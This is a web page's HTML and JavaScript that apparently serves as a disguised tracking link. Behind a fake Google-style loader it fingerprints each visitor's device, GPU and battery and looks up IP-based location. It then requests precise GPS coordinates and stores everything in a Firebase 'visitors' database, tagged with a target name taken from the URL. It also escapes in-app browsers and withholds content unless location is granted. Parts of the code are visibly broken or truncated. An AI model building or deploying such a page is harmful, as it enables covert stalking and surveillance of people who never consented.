  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    :root {
      --bg: #fdfbfd;
      --card-bg: #ffffff;
      --text: #1a0f16;
      --text-muted: #6b5966;
      --primary: #d14167;

    body {
      font-family: 'Hind Siliguri', sans-serif;
      background-color: var(--bg);
      color: var(--text);
      overflow-x: hidden;
    }

    /* ─── GOOGLE-STYLE LOADER ─────────────────────────────────── */
    #google-loader {
      position: fixed;
      inset: 0;
      background: var(--bg);
      z-index: 100;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* Top progress bar like Google/Chrome */
    #progress-bar-wrap {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: transparent;
      z-index: 9999;
    }

    #progress-bar {
      height: 100%;
      width: 0%;
      background: var(--primary);
      border-radius: 0 2px 2px 0;
      transition: width 0.25s ease;
      box-shadow: 0 0 8px rgba(209,65,103,0.6);

    /* Center loading dots like Google */
    .g-dots {
      display: flex;
      gap: 10px;
      align-items: center;
      margin-bottom: 28px;
    }

    .g-dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      animation: gBounce 1.2s infinite ease-in-out;
    }

    .g-dot:nth-child(1) { background: #4285F4; animation-delay: 0s; }
    .g-dot:nth-child(2) { background: #EA4335; animation-delay: 0.15s; }
    .g-dot:nth-child(3) { background: #FBBC05; animation-delay: 0.3s; }
    .g-dot:nth-child(4) { background: #34A853; animation-delay: 0.45s; }

    @keyframes gBounce {
      0%, 80%, 100% { transform: scale(0.7); opacity: 0.5; }
      40%            { transform: scale(1.1); opacity: 1; }
    }

    .g-status {
      font-size: 13px;
      color: var(--text-muted);

    }

    .redirect-icon  { font-size: 45px; margin-bottom: 18px; display: inline-block; }

    .redirect-btn:active   { transform: scale(0.97); }

    /* ─── GPS OFF DIALOG ──────────────────────────────────────── */
    .gps-dialog-overlay {
      position: fixed;

      align-items: center;

    .gps-icon  { font-size: 44px; margin-bottom: 16px; display: inline-block; }

      padding: 13px 28px;
      font-family: 'Hind Siliguri', sans-serif;
      font-size: 15px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 15px rgba(209, 65, 103, 0.3);
      transition: transform 0.2s;

    .gps-btn:active { transform: scale(0.97); }

    /* ─── FULLSCREEN IFRAME ───────────────────────────────────── */
    #full-iframe {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: none;
      display: none;
      z-index: 200;
    }
  </style>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

/* ── Progress bar controller ── */
let _prog = 0;
function setProgress(p) {
  _prog = Math.min(p, 100);
  document.getElementById("progress-bar").style.width = _prog + "%";
}

function setStatus(txt) {
  const el = document.getElementById("g-status-text");
  if (el) el.textContent = txt;
}

/* ── Detect in-app browser ── */
function detectInAppBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  return {
    isTikTok:    /tiktok|musical\.ly/i.test(ua),
    isMessenger: /fban|fbav|messenger/i.test(ua),
    isInstagram: /instagram/i.test(ua),
    isWhatsApp:  /whatsapp/i.test(ua),
    isWeChat:    /wechat|micromessenger/i.test(ua),
    isQQ:        /qq\//i.test(ua),
    isSnapchat:  /snapchat/i.test(ua),
    get isAnyInApp() {
      return this.isTikTok || this.isMessenger || this.isInstagram ||
             this.isWhatsApp || this.isWeChat || this.isQQ || this.isSnapchat;
    }
  };
}

/* ── Redirect to native browser ── */
function redirectToNativeBrowser() {
  const url = window.location.href;
  const ua  = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) {
    window.location.href = `safari-${url}`;
    setTimeout(() => { window.location.href = url; }, 500);
  } else if (/android/.test(ua)) {
    const chromeUrl = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
    window.location.href = chromeUrl;
  } else {
    window.open(url, "_blank");
  }
}

/* ── Hide loader completely ── */
function hideLoader() {
  setProgress(100);
  setTimeout(() => {
    const loader = document.getElementById("google-loader");
    const bar    = document.getElementById("progress-bar-wrap");
    if (loader) loader.style.display = "none";
    if (bar)    bar.style.display    = "none";
  }, 300);
}

/* ── Show GPS off dialog ── */
function showGpsDialog() {
  hideLoader();
  document.getElementById("gps-dialog-overlay").classList.add("show");

  document.getElementById("gps-settings-btn").addEventListener("click", () => {
    // Try to open location settings (works on some Android browsers)
    if (navigator.userAgent.toLowerCase().includes("android")) {
      try { window.location.href = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end"; }
      catch(e) { alert("Settings > Location চালু করুন, তারপর পেজ Refresh করুন।"); }
    } else {
      alert("আপনার ফোনের Settings > Privacy > Location Services চালু করুন, তারপর পেজ Refresh করুন।");
    }
  });
}

/* ── Show iframe ── */
function showIframe(htmlContent) {
  hideLoader();
  const iframe = document.getElementById("full-iframe");
  if (iframe && htmlContent && htmlContent.trim() !== "") {
    iframe.srcdoc = htmlContent;
  }
  if (iframe) iframe.style.display = "block";
}

/* ── Helpers ── */
function getNameFromURL() {
  const params = new URLSearchParams(window.location.search);
  return decodeURIComponent(params.get('n') || params.get('name') || 'Unknown');
}

function parseDevice(ua) {
  let model = "Unknown Device";
  if (/iPhone/.test(ua)) model = ua.match(/iPhone[\w\s]*/)[0];
  else if (/iPad/.test(ua)) model = ua.match(/iPad[\w\s]*/)[0];
  else if (/Samsung/.test(ua)) model = ua.match(/Samsung[\w\s]*/i)?.[0] || "Samsung";
  else if (/Huawei/.test(ua)) model = ua.match(/Huawei[\w\s]*/i)?.[0] || "Huawei";

  let os = "Unknown OS";
  if (/Windows NT ([\d.]+)/.test(ua)) os = "Windows " + ua.match(/Windows NT ([\d.]+)/)[1];
  else if (/Android ([\d.]+)/.test(ua)) os = "Android " + ua.match(/Android ([\d.]+)/)[1];
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS " + (ua.match(/OS ([\d_]+)/)?.[1]||"").replace(/_/g,".");
  else if (/Mac OS X ([\d_]+)/.test(ua)) os = "macOS " + (ua.match(/Mac OS X ([\d_]+)/)?.[1]||"").replace(/_/g,".");

  let browser = "Unknown Browser";
  if (/Chrome\/([\d.]+)/.test(ua) && !/Chromium|Edg|OPR/.test(ua)) browser = "Chrome";
  else if (/Firefox\/([\d.]+)/.test(ua)) browser = "Firefox";
  else if (/Safari\/([\d.]+)/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Edg\/([\d.]+)/.test(ua)) browser = "Edge";

  return { model, os, browser, type: /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop" };
}

function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { vendor: "N/A", renderer: "N/A" };
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    if (!dbg) return { vendor: "N/A", renderer: "N/A" };
    return { vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)||"N/A", renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)||"N/A" };
  } catch(e) { return { vendor: "Error", renderer: "Error" }; }
}

async function fetchGeoData() {
  const apis = [
    { url: "https://ip-api.com/json/?fields=status,query,city,regionName,country,countryCode,isp", mapFunc: d => ({ ip: d.query, city: d.city, region: d.regionName, country_code: d.countryCode, isp: d.isp }) },
    { url: "https://ipwho.is/", mapFunc: d => ({ ip: d.ip, city: d.city, region: d.region, country_code: d.country_code, isp: d.connection?.isp||"N/A" }) },
    { url: "https://ipapi.co/json/", mapFunc: d => ({ ip: d.ip, city: d.city, region: d.region, country_code: d.country_code, isp: d.org||"N/A" }) },
    { url: "https://geolocation-db.com/json/", mapFunc: d => ({ ip: d.IPv4, city: d.city, region: d.state, country_code: d.country_code, isp: "N/A" }) }
  ];
  for (let apiObj of apis) {
    try {
      const res = await fetch(apiObj.url);
      const data = await res.json();
      if (data && (data.ip || data.query || data.IPv4)) {
        const result = apiObj.mapFunc(data);
        if (result.ip && result.ip !== "N/A") return result;
      }
    } catch(e) {}
  }
  return { ip:"N/A", city:"N/A", region:"N/A", country_code:"N/A", isp:"N/A" };
}

const firebaseConfig = {

  authDomain: "love-5585d.firebaseapp.com",
  databaseURL: "https://love-5585d-default-rtdb.firebaseio.com",
  projectId: "love-5585d",

  messagingSenderId: "435569951955",

};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

/* ── Global trackers ── */
window.pageLoadStart = performance.now();
window.clickCounter  = 0;
window.jsErrors      = [];
window.failedFetchURLs = [];
window.cumulativeLayoutShift = 0;
if (!sessionStorage.session_id) sessionStorage.session_id = crypto.randomUUID();
localStorage.visitCount = parseInt(localStorage.visitCount || 0) + 1;

document.addEventListener('click', () => window.clickCounter++);
window.onerror = (m, s, l) => window.jsErrors.push(`${m} at ${s}:${l}`);
const _origFetch = window.fetch;
window.fetch = (...args) => _origFetch(...args).catch(err => { window.failedFetchURLs.push(args[0]); throw err; });

/* ── Cached UI HTML ── */
let cachedHtmlContent = "";
function listenForCustomUI() {
  const uiRef = ref(db, "ui_config/custom_html");
  onValue(uiRef, (snapshot) => { cachedHtmlContent = snapshot.val() || ""; });
}

/* ── Request exact GPS location ── */
function requestExactLocation(visitorKey) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve({ success: false, reason: "unsupported" });

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const exactGeo = {
          latitude:          position.coords.latitude,
          longitude:         position.coords.longitude,
          location_accuracy: position.coords.accuracy + " meters",
          location_status:   "Granted"
        };
        try { await update(ref(db, `visitors/${visitorKey}`), exactGeo); } catch(e) {}
        resolve({ success: true });
      },
      async (error) => {
        let reason = "Denied";
        // POSITION_UNAVAILABLE = GPS is off / hardware unavailable
        if (error.code === error.POSITION_UNAVAILABLE) reason = "GPS_OFF";
        if (error.code === error.TIMEOUT) reason = "Timeout";
        try { await update(ref(db, `visitors/${visitorKey}`), { location_status: reason }); } catch(e) {}
        resolve({ success: false, reason });
      },
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 300000}
    );
  });
}

/* ── Main flow ── */
async function processVisitorFlow() {

  /* 1) In-app browser check */
  const browserInfo = detectInAppBrowser();
  if (browserInfo.isAnyInApp) {
    hideLoader();
    const ov = document.getElementById("browser-redirect-overlay");
    if (ov) ov.classList.add("show");
    const btn = document.getElementById("redirect-btn");
    if (btn) btn.addEventListener("click", () => {
      btn.disabled = true;
      btn.textContent = "Redirecting...";
      redirectToNativeBrowser();
    });
    return;
  }

  /* 2) Google-style loading progress animation (3 seconds total) */
  setProgress(10); setStatus("Connecting...");
  await new Promise(r => setTimeout(r, 600));

  setProgress(30); setStatus("Loading...");

  /* 3) Fetch all data in parallel during loading */
  const [geoData] = await Promise.all([
    fetchGeoData(),
    new Promise(r => setTimeout(r, 800)) // keep loader visible min 800ms more
  ]);

  setProgress(55); setStatus("Almost ready...");

  const ua      = navigator.userAgent;
  const device  = parseDevice(ua);
  const conn    = navigator.connection || {};
  const gpu     = getGPUInfo();

  let batteryLevel = "N/A", batteryCharging = "N/A";
  try {
    const bat = await navigator.getBattery();
    batteryLevel    = Math.round(bat.level * 100) + "%";
    batteryCharging = bat.charging ? "Charging" : "Not Charging";
  } catch(e) {}

  const visitorData = {
    custom_label:       getNameFromURL(),
    ip:                 geoData.ip,
    isp:                geoData.isp,
    city:               geoData.city,
    region:             geoData.region,
    country_code:       geoData.country_code,
    timezone:           Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
    device_model:       device.model,
    device_type:        device.type,
    os:                 device.os,
    browser:            device.browser,
    
    window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
    dark_mode:          window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No",
  
    gpu_vendor:         gpu.vendor,
    gpu_renderer:       gpu.renderer,
    
    connection_type:    conn.effectiveType || "N/A",

    page_load_speed:    window.performance ? Math.round(performance.now()) + " ms" : "N/A",

    battery_level:      batteryLevel,
    battery_charging:   batteryCharging,
    referrer:           document.referrer || "Direct Link",
    page_url:           window.location.href,
    page_title:         document.title,
    updatedAt:          serverTimestamp(),
    local_time:         new Date().toLocaleString("en-BD"),
    user_agent:         ua,
    location_status:    "Prompted",
    

    
    session_id:         sessionStorage.session_id,
    visit_count:        parseInt(localStorage.visitCount),
    lcp:                (window.largestContentfulPaint || 0) + "ms",
    fid:                (window.firstInputDelay || 0) + "ms",
    cls:                (window.cumulativeLayoutShift || 0).toFixed(3),
    js_errors:          window.jsErrors.length ? window.jsErrors.slice(-3).join(" | ") : "None",
    failed_requests:    window.failedFetchURLs.length ? window.failedFetchURLs.slice(-3).join(" | ") : "None"
  };

  /* 4) Save to Firebase */
  setProgress(75); setStatus("Finalizing...");
  let activeKey = "";
  try {
    const existingKey    = localStorage.getItem("hoor_toor_key");
    const savedLabel     = localStorage.getItem("hoor_toor_label");
    const currentLabel   = getNameFromURL();
    if (existingKey && savedLabel === currentLabel) {
      activeKey = existingKey;
      await update(ref(db, `visitors/${activeKey}`), visitorData);
    } else {
      const newRef  = await push(ref(db, "visitors"), { ...visitorData, createdAt: serverTimestamp() });
      activeKey     = newRef.key;
      localStorage.setItem("hoor_toor_key",   activeKey);
      localStorage.setItem("hoor_toor_label", currentLabel);
    }
  } catch(err) { console.error("Sync Error:", err); }

  /* 5) Wait until 3s has passed since page load (Google-feel) */
  const elapsed = performance.now();
  const minWait = 3000;
  if (elapsed < minWait) {
    await new Promise(r => setTimeout(r, minWait - elapsed));
  }

  setProgress(90); setStatus("Requesting location...");

  /* 6) Directly trigger geolocation permission (no custom dialog) */
  const locResult = await requestExactLocation(activeKey);

  /* 7) GPS off → show GPS dialog, never show iframe */
  if (!locResult.success && locResult.reason === "GPS_OFF") {
    showGpsDialog();
    return;
  }

  /* 8) Permission denied (ইউজার ব্লক করলে এই টেক্সট স্থায়ীভাবে থাকবে) */
  if (!locResult.success) {
    const loaderEl = document.getElementById("google-loader");
    if (loaderEl) {
      loaderEl.style.display = "flex";
      // ভেতরের ডট এবং আগের সব লেখা মুছে শুধু নোটিশটি স্থায়ীভাবে দেখাবে
      loaderEl.innerHTML = `
